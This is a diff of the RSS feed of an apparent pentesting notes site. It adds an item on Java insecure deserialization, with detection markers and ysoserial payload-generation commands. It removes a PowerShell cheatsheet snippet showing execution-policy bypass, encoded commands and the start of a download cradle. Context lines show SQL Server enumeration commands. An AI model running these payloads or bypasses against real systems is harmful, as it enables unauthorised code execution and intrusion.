@@ -6,7 +6,18 @@
     <description>Recent content in Docs on Gray Hat Freelancing</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>2023</copyright>
-    <lastBuildDate>Fri, 17 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 23 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Insecure Deserialization - Java</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</link>
+      <pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</guid>
+      <description>Java Deserialization # Detection # &amp;quot;AC ED 00 05&amp;quot; in Hex AC ED: STREAM_MAGIC. Specifies that this is a serialization protocol. 00 05: STREAM_VERSION. The serialization version. &amp;quot;rO0&amp;quot; in Base64 Content-type = &amp;quot;application/x-java-serialized-object&amp;quot; &amp;quot;H4sIAAAAAAAAAJ&amp;quot; in gzip(base64)
+Tools # Ysoserial # frohoff/ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+java -jar ysoserial.jar CommonsCollections1 calc.exe &amp;gt; commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe &amp;gt; groovypayload.bin java -jar ysoserial.</description>
+    </item>
+    
     <item>
       <title>Exercism Solutions</title>
       <link>https://www.grayhatfreelancing.com/docs/exercism_solutions/</link>
@@ -299,15 +310,6 @@ pipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLI
       <guid>https://www.grayhatfreelancing.com/docs/mssql_server_cheatsheet/</guid>
       <description>MSSQL Server # Identify Instances and Databases # Discover Local SQL Server Instances # Get-SQLInstanceLocal Discover Domain SQL Server Instances # Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults Discover Remote SQL Server Instances # Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 Identify Encrypted databases # Note: These are automatically decrypted for admins
 Get-SQLDatabase -Username sa -Password Password1234 -Instance &amp;#34;&amp;lt;DBSERVERNAME\DBInstance&amp;gt;&amp;#34; -Verbose | Where-Object {$_.</description>
-    </item>
-    
-    <item>
-      <title>Powershell Cheatsheet</title>
-      <link>https://www.grayhatfreelancing.com/docs/powershell_cheatsheet/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/powershell_cheatsheet/</guid>
-      <description>Powershell # Summary # Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References Execution Policy # powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process Constrained Mode # # Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2 Encoded Commands # Windows $command = &amp;#39;IEX (New-Object Net.</description>
     </item>
     
   </channel>
